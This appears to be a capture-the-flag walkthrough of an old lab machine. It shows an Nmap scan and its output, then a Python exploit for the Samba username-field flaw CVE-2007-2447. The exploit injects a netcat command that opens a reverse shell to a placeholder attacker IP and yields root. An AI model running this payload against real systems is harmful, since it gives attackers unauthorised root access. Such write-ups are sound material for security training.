01. Reconnaissance

Starting with an Nmap scan to identify open ports and running services:

bash 
nmap -sV -sC -p- --min-rate 5000 -oN nmap.txt 10.10.10.X
output 
Starting Nmap 7.94 ( https://nmap.org )
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
ℹ
Interesting! Samba version 3.0.20 is running — this is a very old version that may be vulnerable to known exploits.

02. Foothold

After researching the Samba version, we find it's vulnerable to CVE-2007-2447 — a command execution vulnerability in the username field.

python 
from smb.SMBConnection import SMBConnection

# Exploit CVE-2007-2447
username = "/=`nohup nc -e /bin/sh ATTACKER_IP 4444`"
conn = SMBConnection(username, "", "", "")
conn.connect("10.10.10.X", 139)
✓
Shell received! We land directly as root — no privilege escalation needed.
